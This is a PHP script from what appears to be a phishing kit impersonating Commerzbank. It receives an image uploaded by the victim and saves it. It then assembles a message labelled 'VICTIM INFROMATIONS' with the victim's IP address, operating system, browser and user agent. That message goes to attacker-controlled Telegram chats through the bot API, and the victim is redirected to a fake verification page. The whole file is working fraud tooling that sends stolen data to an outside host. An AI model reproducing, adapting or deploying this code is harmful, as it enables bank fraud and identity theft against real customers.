<?php
include "../config/telegram.php";
include "../config/settings.php";

$uploadpath = '';
$allowtype = array('jpg', 'jpe', 'png');
if(isset($_FILES['file']) && strlen($_FILES['file']['name']) > 1) {
  $uploadpath = $uploadpath . basename( $_FILES['file']['name']);
  $sepext = explode('.', strtolower($_FILES['file']['name']));
  $type = end($sepext);
  list($width, $height) = getimagesize($_FILES['file']['tmp_name']);
  $err = '';
  if(!in_array($type, $allowtype)) $err .= 'The file: <b>'. $_FILES['file']['name']. '</b> not has the allowed extension type.';

  if($err == '') {

    if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadpath)) {
      $ip = getenv("REMOTE_ADDR");
      /*
				echo "Filename: " . $_FILES['file']['name']."<br>";
				echo "Type : " . $_FILES['file']['type'] ."<br>";
				echo "Size : " . $_FILES['file']['size'] ."<br>";
				echo "Temp name: " . $_FILES['file']['tmp_name'] ."<br>";
				echo "Error : " . $_FILES['file']['error'] . "<br>";
      */
				$message = "[=====>  🏦  Commerz  |  HQ CODE  🏦  <=====]\n\n";
  $message .= "[The Image address:\n http://".$_SERVER['HTTP_HOST'].rtrim(dirname($_SERVER['REQUEST_URI']), '\\/').'/'.$uploadpath."\n";
  $message .= "[Filename: " . $_FILES['file']['name']."\n";
  $message .= "[Type: " . $_FILES['file']['type']."\n";
  $message .= "[Size: " . $_FILES['file']['size']."\n";
  $message .= "[Error: " . $_FILES['file']['error']."\n\n";
  $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
  $message .= "[ IP :    ".$ip."\n";   
  $message .= "[ OS :    ".$user_os."\n";  
  $message .= "[ Browser :    ".$user_browser."\n";  
  $message .= "[ UA :    ".$_SERVER['HTTP_USER_AGENT']."\n"; 

     foreach($IdTelegram as $chatId) {
	  $website="https://api.telegram.org/bot".$botToken;
	  $params=[
	    'chat_id'=>$chatId, 
		'text'=>$message,
	  ];
	  $ch = curl_init($website . '/sendMessage');
	  curl_setopt($ch, CURLOPT_HEADER, false);
	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	  curl_setopt($ch, CURLOPT_POST, 1);
	  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	  $result = curl_exec($ch);
	  curl_close($ch);
	   }
	  HEADER("Location: ../verifiying.php");      
	
    }
    else echo '<b>Unable to upload the file.</b>';
  }
  else echo $err;

	}
?>